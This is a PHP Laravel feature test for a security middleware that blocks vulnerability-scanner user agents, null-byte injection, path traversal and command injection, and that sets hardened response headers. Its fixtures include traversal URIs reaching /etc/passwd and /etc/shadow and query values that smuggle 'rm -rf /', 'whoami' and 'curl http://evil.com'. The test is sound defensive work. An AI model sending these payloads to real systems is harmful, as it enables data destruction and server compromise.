<?php

namespace Tests\Feature\Security;

use App\Models\AuditLog;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class ProtectAttackMiddlewareTest extends TestCase
{
    use RefreshDatabase;

    public function test_vulnerability_scanners_are_blocked(): void
    {
        $maliciousAgents = [
            'sqlmap/1.5.2#stable',
            'Mozilla/5.0 (Nikto/2.1.6)',
            'WPScan v3.8.20',
            'gobuster/3.1.0',
            'masscan/1.0',
        ];

        foreach ($maliciousAgents as $agent) {
            $res = $this->withHeaders(['User-Agent' => $agent])
                ->getJson('/api/v1/health');

            $res->assertStatus(403)
                ->assertJsonPath('status', 'error')
                ->assertJsonPath('code', 'ATTACK_DETECTED');

            $this->assertDatabaseHas('audit_logs', [
                'action' => 'security.attack_blocked',
                'entity_id' => 'scanner_detected',
            ]);
        }
    }

    public function test_null_byte_injection_is_blocked(): void
    {
        $res = $this->get('/api/v1/health?param=test%00malicious');

        $res->assertStatus(400)
            ->assertJsonPath('status', 'error')
            ->assertJsonPath('code', 'INVALID_URI');

        $this->assertDatabaseHas('audit_logs', [
            'action' => 'security.attack_blocked',
            'entity_id' => 'null_byte_injection',
        ]);
    }

    public function test_path_traversal_is_blocked(): void
    {
        $traversalAttempts = [
            '/api/v1/health?file=../../../../etc/passwd',
            '/api/v1/health?path=..%2f..%2fetc%2fshadow',
            '/api/v1/health?doc=..\..\boot.ini',
            '/api/v1/health?view=/etc/hosts',
        ];

        foreach ($traversalAttempts as $uri) {
            $res = $this->getJson($uri);

            $res->assertStatus(403)
                ->assertJsonPath('status', 'error')
                ->assertJsonPath('code', 'PATH_TRAVERSAL_DETECTED');

            $this->assertDatabaseHas('audit_logs', [
                'action' => 'security.attack_blocked',
                'entity_id' => 'path_traversal',
            ]);
        }
    }

    public function test_command_injection_chains_in_query_are_blocked(): void
    {
        $cmdInjections = [
            '/api/v1/health?search=data;+rm+-rf+/',
            '/api/v1/health?query=foo&&+whoami',
            '/api/v1/health?filter=bar||+curl+http://evil.com',
        ];

        foreach ($cmdInjections as $uri) {
            $res = $this->getJson($uri);

            $res->assertStatus(403)
                ->assertJsonPath('status', 'error')
                ->assertJsonPath('code', 'COMMAND_INJECTION_DETECTED');

            $this->assertDatabaseHas('audit_logs', [
                'action' => 'security.attack_blocked',
                'entity_id' => 'command_injection',
            ]);
        }
    }

    public function test_legitimate_requests_receive_enterprise_security_headers(): void
    {
        $res = $this->getJson('/api/v1/health');

        $res->assertStatus(200);

        // Assert all security headers are injected
        $res->assertHeader('X-Content-Type-Options', 'nosniff');
        $res->assertHeader('X-Frame-Options', 'DENY');
        $res->assertHeader('X-XSS-Protection', '1; mode=block');
        $res->assertHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
        $res->assertHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
        $res->assertHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
    }
}

